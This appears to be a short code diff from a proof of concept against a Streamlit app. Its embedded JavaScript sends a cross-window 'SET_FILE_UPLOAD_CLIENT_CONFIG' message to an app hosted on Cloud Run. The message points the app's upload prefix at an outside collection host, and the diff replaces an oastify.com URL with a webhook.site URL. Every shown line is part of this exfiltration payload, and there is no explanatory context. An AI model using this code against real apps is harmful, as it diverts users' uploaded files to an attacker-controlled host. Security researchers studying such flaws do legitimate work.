@@ -23,7 +23,7 @@ components.html("""
       w.postMessage({
         stCommVersion: 1,
         type: "SET_FILE_UPLOAD_CLIENT_CONFIG", 
-        prefix: "https://jdwhu82csdic1derbpee9ax8oe429ay.oastify.com",
+        prefix: "https://webhook.site/204c903f-0e81-48bf-87b6-52bf71edd97f",
         headers: {"abc": "def"}
       }, 'https://activate-fwwrn5gbiq-ey.a.run.app');
     }, 2000);
